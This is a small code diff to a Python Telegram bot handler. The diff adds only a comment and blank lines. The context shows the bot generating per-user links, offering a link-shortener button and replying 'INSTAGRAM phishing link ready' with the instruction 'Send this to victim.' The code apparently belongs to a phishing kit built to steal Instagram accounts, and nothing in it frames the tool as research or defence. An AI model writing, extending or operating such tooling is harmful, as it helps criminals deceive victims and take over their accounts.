@@ -3,6 +3,7 @@ import uuid
 import time
 from config import BASE_URL
 
+# In-memory store for link cache
 link_cache = {}
 
 def generate_link(user_id):
@@ -14,6 +15,7 @@ def generate_link(user_id):
 def handle_insta_callback(bot, call):
     user_id = call.message.chat.id
     link = generate_link(user_id)
+    
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
         InlineKeyboardButton("🔗 Open Link", url=link),
@@ -21,6 +23,7 @@ def handle_insta_callback(bot, call):
         InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
         InlineKeyboardButton("⬅ Back", callback_data="back")
     )
+    
     bot.edit_message_text(
         f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
         chat_id=user_id,
